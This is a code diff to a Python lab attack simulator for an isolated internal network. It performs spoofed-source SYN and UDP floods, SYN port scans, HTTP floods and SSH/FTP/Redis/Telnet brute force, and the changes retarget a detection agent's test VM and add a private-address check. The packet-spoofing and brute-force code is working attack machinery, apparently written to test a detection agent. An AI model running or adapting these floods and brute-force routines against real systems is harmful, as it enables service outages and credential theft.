@@ -5,7 +5,7 @@
  攻击机 attacker —— 隔离内网 多向量 DDoS / 多端口扫描 / 常用端口爆破 模拟器
 ==============================================================================
  部署位置 : /opt/ddos/attacker.py          （root 运行，Scapy 需原始套接字权限）
- 只针对    : 192.168.1.137（默认），严禁 --target 指向网关/公网
+ 只针对    : 靶机（默认从 /etc/ddos/target 或 /etc/hosts 的 ddzt.old 解析），严禁指向网关/公网
  用法示例 :
    python3 attacker.py --mode multi-port --mp-rate 50 --duration 20
    python3 attacker.py --mode brute --brute-kinds ssh,ftp,redis,telnet --duration 40
@@ -13,13 +13,14 @@
             --udp-procs 2 --udp-rate 200 --http-threads 20 --duration 40
    python3 attacker.py --mode http --http-threads 20 --duration 20
    python3 attacker.py --mode dry-run          # 只打印计划，不发包
-   # 多真实源 IP 模拟（先绑定别名：bash add_ips.sh add 192.168.1.233-240）
-   python3 attacker.py --mode mixed --src-range 192.168.1.233-240 --duration 30
+   # 多真实源 IP 模拟（先绑定别名：bash add_ips.sh add 192.168.3.233-240）
+   python3 attacker.py --mode mixed --src-range 192.168.3.233-240 --duration 30
     # 自定义发包大小（MB）：每个逻辑包 1MB，udp 速率 10 逻辑包/秒 ≈ 10MB/s 压带宽
     python3 attacker.py --mode udp --pkt-size 1 --udp-rate 10 --duration 20
 
  模块与并发:
-   syn / udp / multi-port : Scapy 伪造源 IP（默认随机；--src-ips/--src-range 指定时从池抽取）
+   syn / udp / multi-port : Scapy 伪造源 IP（默认用固定伪造源池 198.18.0.x；
+                            --src-ips/--src-range 指定时从给定池抽取）
    http                   : requests 多线程真实握手，threading.Thread；--src-ips 轮询绑定真实源 IP
    brute                  : ssh(paramiko) / ftp(ftplib) / redis(socket) / telnet(socket)；同上轮询绑定
  统一 multiprocessing.Event 控制停止；duration 到期后 stop.set() 并 join。
@@ -35,13 +36,40 @@ import sys
 import threading
 import time
 
+try:                                   # py2 可能没有 ipaddress（CentOS7 python2.7 自带无此模块）
+    import ipaddress
+except ImportError:                    # pragma: no cover
+    ipaddress = None
+
 # ============================================================================
 #                          关键参数常量区
 # ============================================================================
 
-TARGET = "192.168.1.137"          # 靶机 IP（唯一允许攻击的目标）
+TARGET = "192.168.3.152"          # 靶机 IP 兜底值（实际以 /etc/ddos/target 或 hosts 解析为准）
+TARGET_FILE = "/etc/ddos/target"  # 由 2_setup_attacker.sh 生成、tools/net_sync.py 维护
 HTTP_PORT = 80                    # HTTP 模块端口（--port 未指定时使用）
 DURATION = 30                     # 默认持续时间（秒）
+
+
+def resolve_target():
+    """按优先级解析靶机地址：/etc/ddos/target > /etc/hosts 的 ddzt.old > 常量 TARGET"""
+    try:
+        with open(TARGET_FILE, "r") as f:
+            for line in f:
+                s = line.split("#", 1)[0].strip()
+                if s:
+                    return s
+    except (IOError, OSError):
+        pass
+    try:
+        with open("/etc/hosts", "r") as f:
+            for line in f:
+                parts = line.split("#", 1)[0].split()
+                if len(parts) >= 2 and parts[0].count(".") == 3 and "ddzt.old" in parts[1:]:
+                    return parts[0]
+    except (IOError, OSError):
+        pass
+    return TARGET
 
 SYN_PROCS = 4                     # SYN 模块进程数
 SYN_RATE = 200                    # 每进程 SYN 速率（pps）
@@ -156,7 +184,7 @@ def parse_ip(spec):
 
 
 def parse_src_range(spec):
-    """'192.168.1.233-240' 或 '192.168.1.233-192.168.1.240' -> 列表（含两端，上限 1024）"""
+    """'192.168.3.233-240' 或 '192.168.3.233-192.168.3.240' -> 列表（含两端，上限 1024）"""
     spec = str(spec).strip()
     if "-" not in spec:
         return [parse_ip(spec)]
@@ -200,10 +228,29 @@ def local_ipv4s():
 
 
 def spoof_src(src_ips):
-    """伪造源 IP：池非空时从池抽取，否则全随机"""
+    """伪造源 IP：--src-ips 池优先；否则用固定小池（198.18.0.x）。
+    注意不能用「每包全新随机源」：agent 的所有阈值都是按源统计的，
+    每包换源会让每个源只出现一次，SYN/扫描/爆破阈值永远达不到，演练看不到封禁。"""
     if src_ips:
         return random.choice(src_ips)
-    return safe_rand_ip()
+    pool = fake_src_pool()
+    with _FAKE["lock"]:
+        ip = pool[_FAKE["i"] % len(pool)]
+        _FAKE["i"] += 1
+    return ip
+
+
+# 缺省伪造源池（RFC2544 基准测试网段，不会被真实路由）
+FAKE_SRC_NET = os.environ.get("DDOS_FAKE_SRC_NET", "198.18.0")
+FAKE_SRC_COUNT = max(1, int(os.environ.get("DDOS_FAKE_SRC_COUNT", "8")))
+_FAKE = {"ips": [], "i": 0, "lock": threading.Lock()}
+
+
+def fake_src_pool():
+    with _FAKE["lock"]:
+        if not _FAKE["ips"]:
+            _FAKE["ips"] = ["%s.%d" % (FAKE_SRC_NET, i + 1) for i in range(FAKE_SRC_COUNT)]
+        return list(_FAKE["ips"])
 
 
 class SrcPool(object):
@@ -256,22 +303,28 @@ def _load_scapy():
     except ImportError:
         sys.exit("[!] 缺少 scapy，请执行: pip3 install scapy==2.4.5")
     conf.verb = 0
-    conf.iface = detect_iface_for_target()
+    conf.iface = detect_iface_for_target(TARGET)
     return IP, TCP, UDP, Raw, send
 
 
 def detect_iface_for_target(target=None):
-    """以 ip route get <target> 为准，返回出口网卡（默认 eth0）
+    """以 ip route get <target> 为准，返回出口网卡；失败时退回默认路由/第一块非 lo 网卡（默认 eth0）
     target 留空时用全局 TARGET，保证 _load_scapy() 无参调用也能工作。"""
     if not target:
         target = TARGET
     try:
         import subprocess
         import re as _re
-        out = subprocess.check_output(["ip", "route", "get", target], stderr=subprocess.STDOUT)
-        m = _re.search(r"dev\s+(\S+)", out.decode("utf-8", "ignore"))
-        if m:
-            return m.group(1)
+        for cmd in (["ip", "route", "get", target], ["ip", "route", "show", "default"]):
+            out = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
+            m = _re.search(r"dev\s+(\S+)", out.decode("utf-8", "ignore"))
+            if m:
+                return m.group(1)
+        out = subprocess.check_output(["ip", "-o", "-4", "addr", "show"], stderr=subprocess.STDOUT)
+        for line in out.decode("utf-8", "ignore").splitlines():
+            m = _re.search(r"^\d+:\s+(\S+)\s+inet\s", line)
+            if m and m.group(1) != "lo":
+                return m.group(1)
     except Exception:
         pass
     return "eth0"
@@ -340,8 +393,9 @@ def syn_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
                 send(batch, verbose=0)
                 sent += len(batch)
                 nbytes += pkt_bytes
-            except Exception:
-                break
+            except Exception as e:
+                p("  [!] syn 发送失败：%s（退出）" % e)
+                sys.exit(2)
             lim.sleep()
             if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
                 p("  syn  pid=%d  已发送 %d 包 / %.1f MB（%s:%d，%.3fMB/包）"
@@ -360,8 +414,9 @@ def syn_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
         try:
             send(batch, verbose=0)
             sent += len(batch)
-        except Exception:
-            break
+        except Exception as e:
+            p("  [!] syn 发送失败：%s（退出）" % e)
+            sys.exit(2)
         for _ in batch:
             lim.sleep()
         if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
@@ -393,8 +448,9 @@ def udp_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
                 send(batch, verbose=0)
                 sent += len(batch)
                 nbytes += pkt_bytes
-            except Exception:
-                break
+            except Exception as e:
+                p("  [!] udp 发送失败：%s（退出）" % e)
+                sys.exit(2)
             lim.sleep()
             if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
                 p("  udp  pid=%d  已发送 %d 包 / %.1f MB（%s:%d，%.3fMB/包）"
@@ -412,8 +468,9 @@ def udp_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
         try:
             send(batch, verbose=0)
             sent += len(batch)
-        except Exception:
-            break
+        except Exception as e:
+            p("  [!] udp 发送失败：%s（退出）" % e)
+            sys.exit(2)
         for _ in batch:
             lim.sleep()
         if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
@@ -426,23 +483,24 @@ def udp_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
 
 
 def multiport_scan(target, ports, rate, src_ips, stop, stats):
-    """multi-port 模块：遍历端口列表逐个发 SYN（伪造源），检测扫描"""
+    """multi-port 模块：固定一个伪造源遍历端口列表发 SYN（逐源统计才能触发扫描检测）"""
     IP, TCP, _UDP, _Raw, send = _load_scapy()
     lim = RateLimiter(rate)
     sent = 0
     loops = 0
     last_report = time.time()
     while not stop.is_set():
-        for dport in ports:
-            if stop.is_set():
-                break
-            pkt = IP(dst=target, src=spoof_src(src_ips)) / TCP(sport=random.randint(1024, 65535),
-                                                   dport=dport, flags="S")
-            try:
-                send(pkt, verbose=0)
-                sent += 1
-            except Exception:
-                return
+        src = spoof_src(src_ips)          # 每一轮固定一个源，避免每包换源
+        batch = [IP(dst=target, src=src)
+                 / TCP(sport=random.randint(1024, 65535), dport=dport, flags="S")
+                 for dport in ports]
+        try:
+            send(batch, verbose=0)
+            sent += len(batch)
+        except Exception as e:
+            p("  [!] multi-port 发送失败：%s（退出）" % e)
+            sys.exit(2)
+        for _ in batch:
             lim.sleep()
         loops += 1
         if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
@@ -677,11 +735,44 @@ def brute_telnet(target, port, src_ips, stop):
 BRUTE_FUNCS = {"ssh": brute_ssh, "ftp": brute_ftp, "redis": brute_redis, "telnet": brute_telnet}
 
 
+def valid_target(target):
+    """校验靶机地址：必须是私有 IPv4（拒绝公网、主机名、172.0-15/172.32+ 这类伪内网）"""
+    try:
+        socket.inet_aton(target)
+    except (socket.error, OSError):
+        return False, "不是合法 IPv4（不要用主机名）"
+    try:
+        second = int(target.split(".")[1])
+    except (IndexError, ValueError):
+        return False, "不是合法 IPv4"
+    if target.startswith("172.") and not (16 <= second <= 31):
+        return False, "172.%d.x 不是私有网段（仅 172.16-31）" % second
+    if ipaddress is not None:
+        if not (ipaddress.ip_address(target).is_private or target.startswith("127.")):
+            return False, "不是私有地址"
+        return True, ""
+    if target.startswith(("192.168.", "10.", "127.")):
+        return True, ""
+    if target.startswith("172.") and 16 <= second <= 31:
+        return True, ""
+    return False, "不是私有地址"
+
+
 def brute_worker(kind, target, port, src_ips, stop):
     p("  brute[%s] 开始  用户=%s  密码 %d 个  间隔 %.1fs"
       % (kind, ",".join(BRUTE_USERS), len(BRUTE_PASSES), BRUTE_INTERVAL))
-    BRUTE_FUNCS[kind](target, port, src_ips, stop)
-    p("  brute[%s] 结束" % kind)
+    rounds = 0
+    while not stop.is_set():
+        rounds += 1
+        try:
+            BRUTE_FUNCS[kind](target, port, src_ips, stop)
+        except Exception as e:
+            p("  [!] brute[%s] 异常：%s（退出该模块）" % (kind, e))
+            break
+        if stop.is_set():
+            break
+        time.sleep(0.5)
+    p("  brute[%s] 结束（%d 轮）" % (kind, rounds))
 
 
 # ============================================================================
@@ -705,7 +796,7 @@ def start_processes(target, mode, args, stop, stats):
             mk("syn-%d" % i, syn_flood, target, args.port, args.syn_rate, args.src_pool, args.pkt_bytes)
     if mode in ("udp", "mixed"):
         for i in range(args.udp_procs):
-            mk("udp-%d" % i, udp_flood, target, args.port, args.udp_rate, args.src_pool, args.pkt_bytes)
+            mk("udp-%d" % i, udp_flood, target, args.udp_port, args.udp_rate, args.src_pool, args.pkt_bytes)
     if mode in ("multi-port", "mixed"):
         for i in range(1):
             mk("multi-port", multiport_scan, target, ports, args.mp_rate, args.src_pool)
@@ -754,16 +845,18 @@ def run_mode(target, mode, args, stop):
 
 
 def main():
-    global BRUTE_INTERVAL
+    global BRUTE_INTERVAL, TARGET
 
     ap = argparse.ArgumentParser(
-        description="DDoS/扫描/爆破 模拟器（仅限隔离内网，仅打 192.168.1.137）",
+        description="DDoS/扫描/爆破 模拟器（仅限隔离内网，默认靶机从 /etc/ddos/target 解析）",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-    ap.add_argument("--target", default=TARGET, help="靶机 IP（只允许内网）")
+    ap.add_argument("--target", default=resolve_target(), help="靶机 IP（只允许内网）")
     ap.add_argument("--mode", default="mixed", choices=["syn", "udp", "http", "multi-port",
                                                        "brute", "mixed", "dry-run"],
                     help="攻击模式；dry-run 只打印计划")
-    ap.add_argument("--port", type=int, default=HTTP_PORT, help="SYN/UDP/HTTP 目的端口")
+    ap.add_argument("--port", type=int, default=HTTP_PORT, help="SYN/HTTP 目的端口")
+    ap.add_argument("--udp-port", type=int, default=53,
+                    help="UDP 目的端口（agent 只按 53/UDP 判 UDP flood）")
     ap.add_argument("--ports", default="", help="multi-port 端口列表，例如 21,22,80,6379")
     ap.add_argument("--syn-procs", type=int, default=SYN_PROCS, help="SYN 进程数")
     ap.add_argument("--syn-rate", type=int, default=SYN_RATE, help="每进程 SYN pps")
@@ -776,9 +869,9 @@ def main():
     ap.add_argument("--brute-kinds", default=BRUTE_DEFAULT_KINDS, help="ssh,ftp,redis,telnet")
     ap.add_argument("--brute-interval", type=float, default=BRUTE_INTERVAL, help="爆破尝试间隔（秒）")
     ap.add_argument("--src-ips", default="",
-                    help="源 IP 池，逗号分隔，元素可为范围（如 192.168.1.233,192.168.1.235-240）")
+                    help="源 IP 池，逗号分隔，元素可为范围（如 192.168.3.233,192.168.3.235-240）")
     ap.add_argument("--src-range", default="",
-                    help="源 IP 范围，如 192.168.1.233-240 或 192.168.1.233-192.168.1.240")
+                    help="源 IP 范围，如 192.168.3.233-240 或 192.168.3.233-192.168.3.240")
     ap.add_argument("--duration", type=int, default=DURATION, help="持续时间（秒）")
     args = ap.parse_args()
 
@@ -786,9 +879,11 @@ def main():
     if not (0.0 <= args.pkt_size <= PKT_SIZE_MAX_MB):
         raise SystemExit("[!] --pkt-size 需在 0~%.0f MB 之间，当前=%s" % (PKT_SIZE_MAX_MB, args.pkt_size))
     args.pkt_bytes = int(args.pkt_size * 1024 * 1024) if args.pkt_size > 0 else 0
-    target = args.target
-    if not (target.startswith("192.168.") or target.startswith("10.") or target.startswith("172.")):
-        raise SystemExit("[!] 只允许攻击内网地址，当前 --target=%s" % target)
+    target = args.target.strip()
+    ok, why = valid_target(target)
+    if not ok:
+        raise SystemExit("[!] --target 不可用：%s（当前=%s）" % (why, target))
+    TARGET = target                          # 供 _load_scapy()/detect_iface_for_target() 使用
     # 无论何种模式都先校验爆破协议参数，避免跑完 30s 才发现拼写错误
     kinds = kind_list(args.brute_kinds, list(BRUTE_FUNCS.keys()))
 
@@ -818,7 +913,7 @@ def main():
     if args.mode == "dry-run":
         ports = port_list(args.ports) if args.ports else DEFAULT_PORTS
         print("   syn        : procs=%d rate=%d pps/进程 port=%d" % (args.syn_procs, args.syn_rate, args.port))
-        print("   udp        : procs=%d rate=%d pps/进程 port=%d" % (args.udp_procs, args.udp_rate, args.port))
+        print("   udp        : procs=%d rate=%d pps/进程 port=%d" % (args.udp_procs, args.udp_rate, args.udp_port))
         print("   http       : threads=%d http://%s:%d/" % (args.http_threads, target, args.port))
         print("   multi-port : %d 个端口 rate=%d pps/端口 -> %s" % (len(ports), args.mp_rate, ports))
         print("   brute      : kinds=%s interval=%.2fs" % (",".join(kinds), args.brute_interval))
